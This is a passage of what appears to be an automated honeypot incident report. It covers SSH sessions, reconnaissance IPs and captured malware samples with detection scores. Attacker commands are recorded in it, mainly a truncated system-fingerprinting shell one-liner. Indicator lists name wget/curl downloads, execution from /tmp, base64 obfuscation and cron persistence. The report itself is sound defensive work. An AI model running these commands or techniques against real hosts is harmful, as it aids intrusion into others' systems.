| `2026-09-06 12:33:41` | `cowrie.client.version` |
| `2026-09-06 12:33:41` | `cowrie.client.kex` |
| `2026-09-06 12:33:42` | `cowrie.login.success` |
| `2026-09-06 12:33:43` | `cowrie.session.params` |
| `2026-09-06 12:33:43` | `cowrie.command.input` |
| `2026-09-06 12:33:43` | `cowrie.log.closed` |
| `2026-09-06 12:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8011c3366376

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:36 |
| **Last Seen** | 2026-09-06 12:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:36:14` | `cowrie.session.connect` |
| `2026-09-06 12:36:14` | `cowrie.client.version` |
| `2026-09-06 12:36:14` | `cowrie.client.kex` |
| `2026-09-06 12:36:16` | `cowrie.login.success` |
| `2026-09-06 12:36:18` | `cowrie.session.params` |
| `2026-09-06 12:36:18` | `cowrie.command.input` |
| `2026-09-06 12:36:19` | `cowrie.log.closed` |
| `2026-09-06 12:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc50c9ce9c49

| Field | Detail |
|---|---|
| **Source IP** | `113.11.100[.]109` |
| **First Seen** | 2026-09-06 12:37 |
| **Last Seen** | 2026-09-06 12:39 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:37:51` | `cowrie.session.connect` |
| `2026-09-06 12:37:54` | `cowrie.login.success` |
| `2026-09-06 12:37:55` | `cowrie.session.params` |
| `2026-09-06 12:37:55` | `cowrie.command.input` |
| `2026-09-06 12:37:55` | `cowrie.command.failed` |
| `2026-09-06 12:37:57` | `cowrie.command.input` |
| `2026-09-06 12:37:57` | `cowrie.command.failed` |
| `2026-09-06 12:38:00` | `cowrie.command.input` |
| `2026-09-06 12:38:00` | `cowrie.command.failed` |
| `2026-09-06 12:38:00` | `cowrie.command.input` |
| `2026-09-06 12:38:01` | `cowrie.command.input` |
| `2026-09-06 12:38:02` | `cowrie.command.input` |
| `2026-09-06 12:38:02` | `cowrie.command.success` |
| `2026-09-06 12:38:12` | `cowrie.session.file_download.failed` |
| `2026-09-06 12:38:22` | `cowrie.session.file_download.failed` |
| `2026-09-06 12:39:02` | `cowrie.log.closed` |
| `2026-09-06 12:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.100[.]109` to AbuseIPDB if not already reported
- [ ] Block `113.11.100[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11df335843db

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:38 |
| **Last Seen** | 2026-09-06 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:38:35` | `cowrie.session.connect` |
| `2026-09-06 12:38:35` | `cowrie.client.version` |
| `2026-09-06 12:38:35` | `cowrie.client.kex` |
| `2026-09-06 12:38:36` | `cowrie.login.success` |
| `2026-09-06 12:38:38` | `cowrie.session.params` |
| `2026-09-06 12:38:38` | `cowrie.command.input` |
| `2026-09-06 12:38:38` | `cowrie.log.closed` |
| `2026-09-06 12:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8dfecce519

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:41 |
| **Last Seen** | 2026-09-06 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:41:03` | `cowrie.session.connect` |
| `2026-09-06 12:41:04` | `cowrie.client.version` |
| `2026-09-06 12:41:04` | `cowrie.client.kex` |
| `2026-09-06 12:41:07` | `cowrie.login.success` |
| `2026-09-06 12:41:09` | `cowrie.session.params` |
| `2026-09-06 12:41:09` | `cowrie.command.input` |
| `2026-09-06 12:41:09` | `cowrie.log.closed` |
| `2026-09-06 12:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55287fbfbb66

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:43 |
| **Last Seen** | 2026-09-06 12:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:43:26` | `cowrie.session.connect` |
| `2026-09-06 12:43:26` | `cowrie.client.version` |
| `2026-09-06 12:43:26` | `cowrie.client.kex` |
| `2026-09-06 12:43:28` | `cowrie.login.success` |
| `2026-09-06 12:43:30` | `cowrie.session.params` |
| `2026-09-06 12:43:30` | `cowrie.command.input` |
| `2026-09-06 12:43:30` | `cowrie.log.closed` |
| `2026-09-06 12:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d55132d4abe

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:46 |
| **Last Seen** | 2026-09-06 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:46:43` | `cowrie.session.connect` |
| `2026-09-06 12:46:43` | `cowrie.client.version` |
| `2026-09-06 12:46:43` | `cowrie.client.kex` |
| `2026-09-06 12:46:43` | `cowrie.login.success` |
| `2026-09-06 12:46:44` | `cowrie.session.params` |
| `2026-09-06 12:46:44` | `cowrie.command.input` |
| `2026-09-06 12:46:44` | `cowrie.log.closed` |
| `2026-09-06 12:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1f94bc934d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:52 |
| **Last Seen** | 2026-09-06 12:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:52:57` | `cowrie.session.connect` |
| `2026-09-06 12:52:57` | `cowrie.client.version` |
| `2026-09-06 12:52:57` | `cowrie.client.kex` |
| `2026-09-06 12:52:58` | `cowrie.login.success` |
| `2026-09-06 12:52:59` | `cowrie.session.params` |
| `2026-09-06 12:52:59` | `cowrie.command.input` |
| `2026-09-06 12:52:59` | `cowrie.log.closed` |
| `2026-09-06 12:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.38.138[.]175` | **29** | 2026-09-06 07:42 | 2026-09-06 07:43 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.104[.]9` | **29** | 2026-09-06 08:35 | 2026-09-06 08:35 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `217.60.255[.]130` | **7** | 2026-09-06 07:03 | 2026-09-06 12:23 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **5** | 2026-09-06 08:02 | 2026-09-06 12:02 | 0m | 10 | `T1110.001 · T1592` | 🟢 LOW |
| `37.52.241[.]153` | **3** | 2026-09-06 08:02 | 2026-09-06 08:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `134.33.70[.]21` | **2** | 2026-09-06 08:12 | 2026-09-06 08:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **2** | 2026-09-06 12:41 | 2026-09-06 12:48 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | **2** | 2026-09-06 08:21 | 2026-09-06 08:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-09-06 07:04 | 2026-09-06 08:00 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-09-06 12:00 | 2026-09-06 12:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-09-06 09:54 | 2026-09-06 09:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.153.81[.]58` | 1 | 2026-09-06 10:34 | 2026-09-06 10:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.46[.]117` | 1 | 2026-09-06 08:06 | 2026-09-06 08:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.201.187[.]183` | 1 | 2026-09-06 11:01 | 2026-09-06 11:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-06 08:36 | 2026-09-06 08:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-06 11:43 | 2026-09-06 11:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.231.182[.]60` | 1 | 2026-09-06 10:27 | 2026-09-06 10:27 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.106.20[.]121` | 1 | 2026-09-06 07:15 | 2026-09-06 07:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]227` | 1 | 2026-09-06 07:45 | 2026-09-06 07:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.226.76[.]34` | 1 | 2026-09-06 07:05 | 2026-09-06 07:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]93` | 1 | 2026-09-06 07:57 | 2026-09-06 07:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]169` | 1 | 2026-09-06 07:21 | 2026-09-06 07:21 | 11s | 0 | `T1592` | 🟢 LOW |
| `37.186.114[.]181` | 1 | 2026-09-06 07:13 | 2026-09-06 07:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.186.121[.]186` | 1 | 2026-09-06 07:13 | 2026-09-06 07:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-09-06 07:46 | 2026-09-06 07:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-06 08:38 | 2026-09-06 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-09-06 09:43 | 2026-09-06 09:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]167` | 1 | 2026-09-06 07:36 | 2026-09-06 07:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-09-06 10:02 | 2026-09-06 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.125.16[.]226` | 1 | 2026-09-06 07:27 | 2026-09-06 07:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-06 09:03 | 2026-09-06 09:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]67` | 1 | 2026-09-06 07:57 | 2026-09-06 07:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]71` | 1 | 2026-09-06 07:45 | 2026-09-06 07:45 | 10s | 0 | `T1592` | 🟢 LOW |
| `85.198.19[.]241` | 1 | 2026-09-06 11:57 | 2026-09-06 11:58 | 44s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]5` | 1 | 2026-09-06 09:52 | 2026-09-06 09:52 | 1s | 0 | `T1592` | 🟢 LOW |
| `95.31.253[.]126` | 1 | 2026-09-06 07:27 | 2026-09-06 07:28 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
